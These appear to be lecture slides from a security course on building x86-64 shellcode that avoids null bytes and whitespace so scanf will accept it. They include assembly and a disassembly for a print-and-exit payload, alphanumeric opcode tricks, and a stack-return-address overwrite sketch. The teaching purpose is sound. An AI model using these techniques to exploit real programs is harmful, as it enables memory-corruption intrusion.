
### some logistical issues 


* Sure, 1000 <code>a</code>'s can be read by <code>scanf</code> with <code>%s</code>, but machine code?


### scanf accepted characters  {.smaller}


* <code>%s</code> --- "Matches a sequence of non-white-space characters"
* can't use: 

   * `‚ê£`
   * `\t`
   * `\v` ("vertical tab")
   * `\r` ("carriage return")
   * `\n`

* not actually that much of a restriction
* what about `\0` --- we used a lot of those


### why did we have zeroes?  {.smaller}



* previous machine code:

<code>48 8d 35 <span style="color: red">15 00 00 00</span></code>  (lea <span style="color: red">string</span>(%rip), %rsi) <br>
<code>b8 <span style="color: red">01 00 00 00</span></code> (mov \$<span style="color: red">1</span>, %eax) <br>
<code>bf <span style="color: red">25 00 00 00</span></code> (mov \$<span style="color: red">37</span>, %edi) <br>
<code>0f 05</code> (syscall) <br>
<code>b8 <span style="color: red">e7 00 00 00</span></code> (mov \$<span style="color: red">231</span>, %eax) <br>
<code>31 ff</code> (xor %edi, %edi) <br>
<code>0f 05</code> (syscall) 

* problem: happened to be encoding of constants


### shellcode without 0s 

<!-- \lstset{
    language=myasm,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
} -->
  
```{.gnuassembler code-line-numbers=true}
shellcode:
    jmp afterString
string:
    .ascii "You have been..."
afterString:
    leaq string(%rip), %rsi
    xor %eax, %eax
    xor %edi, %edi
    movb $1, %al
    movb $37, %dl
    syscall
    movb $231, %al
    xor %edi, %edi
    syscall
```

### shellcode without 0s 

  
```{.gnuassembler code-line-numbers="2,9,10,12"}
shellcode:
    jmp afterString
string:
    .ascii "You have been..."
afterString:
    leaq string(%rip), %rsi
    xor %eax, %eax
    xor %edi, %edi
    movb $1, %al
    movb $37, %dl
    syscall
    movb $231, %al
    xor %edi, %edi
    syscall
```

::: {.myoverbox .right}

one-byte constants/offsets, <br />
so no leading zero bytes <br />
`jmp afterString` is `eb 25` <br />
&nbsp;&nbsp;&nbsp;(jump forward 0x25 bytes) <br />
`movb $1, %al` is `b0 01`

:::

### shellcode without 0s 

  
```{.gnuassembler code-line-numbers="6"}
shellcode:
    jmp afterString
string:
    .ascii "You have been..."
afterString:
    leaq string(%rip), %rsi
    xor %eax, %eax
    xor %edi, %edi
    movb $1, %al
    movb $37, %dl
    syscall
    movb $231, %al
    xor %edi, %edi
    syscall
```

::: {.myoverbox .right}

leaq still uses four-byte offset <br />
but now it's negative <br />
`d4 ff ff ff` (-44)

:::

### shellcode without 0s  {.smaller}


```
0000000000000000 <shellcode>:
   0:   eb 25                   jmp    27 <afterString>

0000000000000002 <string>:
    ...

0000000000000027 <afterString>:
  27:   48 8d 35 d4 ff ff ff    lea    -0x2c(%rip),%rsi        # 2 <string>
  2e:   31 c0                   xor    %eax,%eax
  30:   31 ff                   xor    %edi,%edi
  32:   b0 01                   mov    $0x1,%al
  34:   b2 25                   mov    $0x25,%dl
  36:   0f 05                   syscall 
  38:   b0 e7                   mov    $0xe7,%al
  3a:   31 ff                   xor    %edi,%edi
  3c:   0f 05                   syscall 

```


### what about other funny characters?  {.smaller}


* suppose we can't use ASCII newlines in machine code
* what if we need to move 0xA (= newline character) into a register 
<hr class="vspace" />
* cannot do <code>movb \$10, %al</code> --- contains 0x0a byte
* can do: <code>xor %eax, %eax; inc %eax; inc %eax, ...</code> 
<hr class="vspace" />
* similar patterns for lots of operations


### x86 flexibility  {.smaller}


* x86 opcodes that are normal ASCII chars are pretty flexibile
* <code>0</code>--<code>5</code> 

   * various forms of <code>xor</code>

* <code>@</code>, <code>A</code>--<code>Z</code>, <code>[</code>, <code>\\</code>, <code>]</code>, <code>^</code>, <code>_</code> 

   * <code>inc</code>, <code>dec</code>, <code>push</code>, <code>pop</code> with first eight 32-bit registers

* <code>h</code> --- push one-byte constant
* <code>i</code> --- <code>imul</code> constant, reg, reg
* <code>H</code> --- REX prefix with 'W' set
* <code>p</code>--<code>z</code> --- conditional jumps to 1-byte offset 
<hr class="vspace" />
* note: can <em>write machine code on stack, then run it</em>


### some alphanumeric shellcode patterns  


```
// mov %rax, %rcx
push %rax
pop %rcx

// %rax = 0
pushb $0x41
pop %rax
xor $0x41, %ax

```


### falling through to written code on stack


```
/* beginning of shellcode */
/* ... set %rbx, %rax to contain machine code ... */
popq %rcx 
popq %rcx 
pushq %rax
pushq %rbx
nop
nop
nop
...
.long 0  /* <-- %rsp pointers here after first pop */
.long 0  /* <-- %rsp points here when shellcode starts */
/* overwritten return address: */
.long pointer_to_shellcode
```


### actual limitation 


* overwriting with address?
   * probably can't make sure that's all normal ASCII chars
* (but could leave most significant bits of existing address unchanged)

